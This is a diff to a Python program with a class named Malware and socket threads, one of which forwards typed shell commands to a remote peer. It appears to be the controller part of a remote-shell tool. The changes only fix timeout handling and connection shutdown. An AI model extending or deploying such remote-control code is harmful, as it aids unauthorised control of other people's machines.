@@ -38,7 +38,7 @@ class InThread(threading.Thread):
             self.conn, self.in_ip = self.socket.accept()
             print('Connection received from {} on port {}'.format(self.in_ip[0], self.in_ip[1]))
             #self.init_public_key()
-        except timeout:
+        except socket.timeout:
             print('No response from {}'.format(self.ip))
         else:
             self.start()
@@ -51,9 +51,13 @@ class InThread(threading.Thread):
                 again = False
             else:
                 print(msg)
+        self.stop()
 
+    def stop(self):
+        #self.socket.shutdown(socket.SHUT_RDWR)
         self.socket.close()
-        print('Closed socket coming from {}'.format(self.in_addr))
+
+        print('Closed socket coming from {}'.format(self.in_ip))
 
     def init_public_key(self):
         try:
@@ -61,7 +65,7 @@ class InThread(threading.Thread):
             global remote_public_key
             remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
             print("Remote public key successfully loaded")
-        except timeout:
+        except socket.timeout:
             self.init_public_key()
         except ValueError:
             print("Invalid Public Key received")
@@ -111,6 +115,7 @@ class OutThread(threading.Thread):
                         pass
                     elif shell == 'exit':
                         keepalive = False
+                        self.send(shell)
                     else:
                         self.send(shell)
             elif msg == 'info':
@@ -118,7 +123,8 @@ class OutThread(threading.Thread):
             else:
                 print('List of known functions : ', ' '.join(known_commands))
 
-
+        time.sleep(2)
+        self.sock.shutdown(socket.SHUT_RDWR)
         self.sock.close()
         print('Terminated connection to {}'.format(self.ip))
 
@@ -168,7 +174,7 @@ class Malware():
         if self.cons.is_alive():
             self.cons.join()
         if self.prod.is_alive():
-            self.prod.join()
+            self.prod.stop()
 
         self.stop()
 
